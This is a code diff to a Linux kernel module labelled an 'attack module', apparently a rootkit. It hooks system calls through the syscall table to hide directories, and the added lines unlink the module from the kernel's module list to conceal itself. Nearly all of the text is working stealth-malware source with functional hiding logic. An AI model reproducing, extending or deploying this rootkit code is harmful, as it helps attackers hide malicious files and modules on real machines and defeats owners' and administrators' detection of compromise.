@@ -27,6 +27,8 @@ void unpatch(int callnum) {
 
 int init_module() {
 	int bootresult;
+	struct module* this_mod;
+	preempt_disable();
 	printk(KERN_INFO "Attempting to initialize attack module.\n");
 	hiddenDirectories = vector_init();
 	make_rw(sys_call_table);
@@ -34,8 +36,9 @@ int init_module() {
 	memcpy(backup_sys_call_table, sys_call_table, sizeof(backup_sys_call_table));
 
 	//start up the payload
-	bootresult = bootprocess();
-	if (bootresult) printk(KERN_INFO "Boot process failed: %d", bootresult);
+	//this has been changed, the payload now starts the rootkit
+	//bootresult = bootprocess();
+	//if (bootresult) printk(KERN_INFO "Boot process failed: %d", bootresult);
 
 	//shim the syscalls. 
 	patch(SYS_getdents, getdentsShim);
@@ -43,14 +46,28 @@ int init_module() {
 	patch(SYS_mkdir, mkdirShim);
 	//patch(SYS_fork, forkShim);
 	//patch(SYS_clone, cloneShim);
-	//patch(SYS_open, openShim); This one is patched later, on request of the payload. This is because doing this during boot results in an error.
+	//patch(SYS_open, openShim);
 	//patch(SYS_close, closeShim);
 
 	//request module and payload to be hidden
-	hideDirectory(secret_ko_name);
-	hideDirectory(secret_payload_name);
+	//These are now done by the payload
+	//hideDirectory(secret_ko_name);
+	//hideDirectory(secret_payload_name);
+
+	//hide this module from the list
+	mutex_lock(&module_mutex);
+	this_mod = find_module("attack_module"); //it turns out the name attack_module is part of the binary, not the filename
+	if (this_mod) {
+		printk(KERN_INFO "found module, hiding\n");
+		list_del_rcu(&this_mod->list);
+	}
+	else {
+		printk(KERN_INFO "could not find module\n");
+	}
+	mutex_unlock(&module_mutex);
 
 	printk(KERN_INFO "Module loaded\n");
+	preempt_enable();
 	return 0;
 }
 
@@ -60,7 +77,7 @@ void cleanup_module() {
 
 	//restore the system call table, in reverse order
 	//unpatch(SYS_close);
-	unpatch(SYS_open);
+	//unpatch(SYS_open);
 	//unpatch(SYS_clone);
 	//unpatch(SYS_fork);
 	unpatch(SYS_mkdir);
